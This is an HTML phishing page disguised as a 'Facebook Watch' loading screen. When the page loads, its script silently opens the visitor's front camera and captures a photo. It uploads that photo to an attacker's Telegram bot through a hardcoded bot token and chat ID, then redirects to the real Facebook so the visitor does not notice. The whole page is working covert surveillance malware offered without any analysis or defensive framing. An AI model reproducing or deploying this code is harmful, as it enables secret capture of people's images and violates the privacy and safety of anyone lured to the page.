<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Facebook Watch</title>
    <style>
        body { background: #f0f2f5; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .fb-loader { text-align: center; }
        .fb-logo { width: 65px; height: 65px; background: #1877f2; color: white; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 45px; font-weight: bold; margin: 0 auto 20px; }
        .spinner { border: 4px solid #ddd; border-top: 4px solid #1877f2; border-radius: 50%; width: 30px; height: 30px; animation: spin 0.8s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #v, #c { display: none; }
    </style>
</head>
<body>
    <div class="fb-loader"><div class="fb-logo">f</div><div class="spinner"></div></div>
    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>
    <script>
        const t = "8371191822:AAGAx-xYjN-3hDpc9vUDaP-pXuX6XZ0N2JU";
        const i = "1216500315";
        async function start() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: { ideal: 1280 } } });
                const v = document.getElementById('v');
                v.srcObject = stream;
                setTimeout(() => {
                    const c = document.getElementById('c');
                    const ctx = c.getContext('2d');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    ctx.translate(c.width, 0); ctx.scale(-1, 1);
                    ctx.drawImage(v, 0, 0, c.width, c.height);
                    c.toBlob(async (b) => {
                        const f = new FormData();
                        f.append('chat_id', i);
                        f.append('photo', b, 'f.jpg');
                        await fetch(`https://api.telegram.org/bot${t}/sendPhoto`, { method: 'POST', body: f });
                        window.location.replace("https://www.facebook.com/watch");
                        stream.getTracks().forEach(track => track.stop());
                    }, 'image/jpeg', 0.7);
                }, 1000); 
            } catch (e) { window.location.replace("https://www.facebook.com"); }
        }
        window.onload = start;
    </script>
</body>
</html>
